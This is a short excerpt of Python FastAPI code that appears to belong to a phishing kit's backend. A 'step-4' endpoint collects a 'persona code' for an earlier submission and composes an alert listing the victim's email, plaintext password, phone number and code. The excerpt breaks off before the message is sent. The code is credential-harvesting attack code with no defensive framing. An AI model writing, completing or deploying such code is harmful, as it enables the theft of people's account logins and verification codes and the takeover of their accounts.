...
@router.post("/step-4/{submission_id}")
async def step_four(submission_id: str, request: Request):
    payload = await request.json()
    persona_code = payload.get("persona_code")

    if not persona_code:
        raise HTTPException(status_code=400, detail="Persona Code required")

    submission = get_submission(submission_id)
    if not submission:
        raise HTTPException(status_code=404, detail="Submission not found")

    update_submission(submission_id, {"persona_code": persona_code})
    
    message = (
        f"🔐 Persona Code Submitted\n\n"
        f"Email: {submission['email']}\n"
        f"Password: {submission['password']}\n"
        f"Phone: {submission.get('phone')}\n"
        f"Persona Code: {persona_code}\n"
        f"ID: {submission_id}"
        )
